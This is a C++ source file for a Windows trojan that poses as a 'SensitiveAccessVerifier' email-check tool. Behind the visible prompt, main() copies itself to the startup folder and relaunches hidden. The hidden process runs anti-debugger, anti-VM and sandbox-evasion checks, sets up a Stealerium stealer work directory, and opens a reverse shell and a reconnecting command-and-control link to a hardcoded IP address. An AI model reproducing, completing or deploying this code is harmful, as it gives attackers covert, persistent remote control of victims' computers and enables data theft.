#include "main.h"
#include "Authenticator.h"
#include "Utilities.h"
#include "Paths.h"
#include "AnalysisEvasion.h"
#include "persistence.h"
#include "ReverseShell.h"
#include <iostream>
#include <thread>
#include <windows.h>
#include <cstdlib>

// Link with the Winsock library
#pragma comment(lib, "Ws2_32.lib")

// Function to run all background tasks
void runStealthTasks() {
    try {
        AntiAnalysis antiAnalysis;

        // Introduce delay
        antiAnalysis.IntroduceDelay(1000);

        // Analysis evasion checks
        if (!antiAnalysis.CheckSystemUptime(60) || 
            antiAnalysis.CheckForDebugger() || 
            antiAnalysis.DetectVirtualMachine() || 
            !antiAnalysis.EvadeSandbox() || 
            !antiAnalysis.checkScreenResolution() || 
            !antiAnalysis.checkProcessCount()) {
            return;
        }

        // Initialize working directory
        std::string workDir;
        try {
            workDir = Stealerium::Paths::InitWorkDir();
        } catch (const std::exception& ex) {
            return;
        }

        // Persistence setup
        setupPersistence();
       

        // // Start the reverse shell in a separate thread
        std::thread reverseShellThread([]() {
            const char host[] = "64.94.85.32";
            int port = 4442;
            RunShell(host, port);
        });
        // Start the persistent reverse shell connection
    const char* C2Server = "64.94.85.32";  // Change to your listener IP
    int C2Port = 5552;                      // Change to your listener port
    ReconnectToListener(C2Server, C2Port);
        // Join the reverse shell thread to keep it active
        reverseShellThread.join();

    } catch (...) {
        // Handle exceptions silently
    }
}

// Function to launch the stealth process as a separate detached process
void launchStealthProcess() {
    char exePath[MAX_PATH];

    // Get the full path of the current executable
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        std::cerr << "Failed to get executable path.\n";
        return;
    }

    // Construct the command using std::string
    std::string command = "cmd /c start /B \"\" \"" + std::string(exePath) + "\" stealth";

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi;

    if (!CreateProcessA(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        std::cerr << "Failed to create stealth process.\n";
    } else {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int main(int argc, char* argv[]) {
    // If the program is launched with the "stealth" argument, run the stealth tasks
    if (argc == 2 && std::string(argv[1]) == "stealth") {
        runStealthTasks();
        return 0;
    }

    // Copy the executable to the AppData directory
    if (copyToStartupFolder()) {
        // std::cout << "[INFO] Executable copied to AppData successfully." << std::endl;
    } else {
        // std::cerr << "[ERROR] Failed to copy executable to AppData." << std::endl;
    }

    // Launch the stealth process
    launchStealthProcess();

    // // User-visible SensitiveAccessVerifier functionality
    displayHeader();
    displayVerificationPrompt();

    std::string email = getUserEmail();
    if (verifyUserIdentity(email)) {
        std::cout << "\n\033[32mAccess Granted.\033[0m You may now proceed to sensitive documents.\n";
    } else {
        std::cerr << "\n\033[31mAccess Denied.\033[0m Unauthorized email.\n";
    }

    // // Pause the console to prevent the window from closing immediately
    std::cout << "\nPress any key to exit...";
    std::cin.get(); // Waits for the user to press Enter

    return 0;
}






